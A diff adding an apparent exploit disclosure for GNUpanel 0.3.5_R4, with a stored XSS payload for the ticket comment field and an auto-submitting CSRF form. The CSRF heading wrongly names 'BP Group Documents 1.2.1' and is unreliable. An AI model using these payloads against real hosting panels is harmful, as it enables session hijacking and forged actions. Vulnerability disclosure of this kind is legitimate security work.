@@ -1,0 +1,65 @@
+# Exploit Title		:GNUpanel 0.3.5_R4 - Multiple Vulnerabilities
+# Vendor Homepage	:http://wp.geeklab.com.ar/gl-en/gnupanel/
+# GNUPanel Version	:0.3.5_R4
+# Server			:Centos 6.4
+# Exploit Author	:Necmettin COSKUN =>@babayarisi
+# Blog				:http://www.ncoskun.com http://www.grisapka.org
+# Discovery date	:03/11/2014
+# CVE				:N/A
+ 
+GNUPanel is a hosting control panel for Debian. It is written in PHP and it is tailored to run on 32 and 64 bit Debian GNU/Linux web hosting servers.  
+Description
+================
+Stored XSS vulnerability
+ 
+Vulnerability
+================
+GNUPanel has a pure coded ticket support system   Comment "consultar" field is not ascaped so any 
+tags including script tags can be stored in them.
+customer client can send malicious ticket to reseller client
+reseller client can send malicious ticket to Server Admin
+ 
+Proof of concept
+================
+Go to Support tab and click > New Ticket 
+Set subject field Demo
+Set comment field "><script>alert("XSS");</script>
+Click Send.
+Go to Support tab and Click >Pending tickets
+Click read button  Bingo XSS ;)
+================
+ 
+Second one:
+CSRF vulnerability
+================
+ 
+Description
+================
+CSRF vulnerability in BP Group Documents 1.2.1
+ 
+Vulnerability
+================
+An unauthenticated user can cause a logged in user to create support ticket including
+malicious code.
+ 
+Proof of concept
+================
+<html>
+<body>
+<form id="baba" method="post" action="http://demo/gnupanel-reseller.php?seccion=tickets&plugin=enviar_ticket"> 
+<input name="asunto" size="45" value="Demo12" maxlength="254"> 
+<textarea name="consultar" rows="10" cols="50"><script>alert("XSS");</script>&lt;/textarea&gt;
+<input name="ingresando" value="1" type="hidden"> 
+<input name="resetea" value="Reset" type="reset">
+<input name="agrega" value="Send" type="submit"> 
+</form>
+<script
+type="text/javascript">document.getElementById("baba").submit();
+</script>
+</body>
+</html>
+================
+  
+Discovered by:
+================
+Necmettin COSKUN  |GrisapkaGuvenlikGrubu|4ewa2getha!
